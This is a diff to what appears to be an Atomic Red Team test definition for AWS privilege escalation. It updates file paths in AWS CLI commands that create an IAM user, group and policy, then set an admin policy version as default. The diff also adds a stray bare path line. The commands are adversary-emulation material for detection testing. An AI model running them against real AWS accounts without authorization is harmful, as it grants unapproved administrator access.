@@ -1,4 +1,4 @@
-attack_technique: TA0004
+attack_technique: TA0004.001
 display_name: AWS Privillege Escalation 
 atomic_tests:
 - name: iam:CreatePolicyVersion 
@@ -22,9 +22,10 @@ atomic_tests:
       aws iam create-user --user-name #{username}
       aws iam create-group --group-name #{username}
       aws iam add-user-to-group --user-name #{username} --group-name #{username}
-      aws iam create-policy --policy-name #{username} --policy-document file:///Users/bpatel/Research/malware/github/atomic-red-team/atomics/TA0004/src/default_policy.json
+      $PathToAtomicsFolder
+      aws iam create-policy --policy-name #{username} --policy-document file://$PathToAtomicsFolder/TA0004.001/src/default_policy.json
       aws iam attach-group-policy --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --group-name #{username}
-      aws iam create-policy-version --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --policy-document file:///Users/bpatel/Research/malware/github/atomic-red-team/atomics/TA0004/src/admin_policy.json --set-as-default
+      aws iam create-policy-version --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --policy-document file://$PathToAtomicsFolder/TA0004.001/src/admin_policy.json --set-as-default
 
     cleanup_command: |
       aws iam remove-user-from-group --user-name #{username} --group-name #{username}
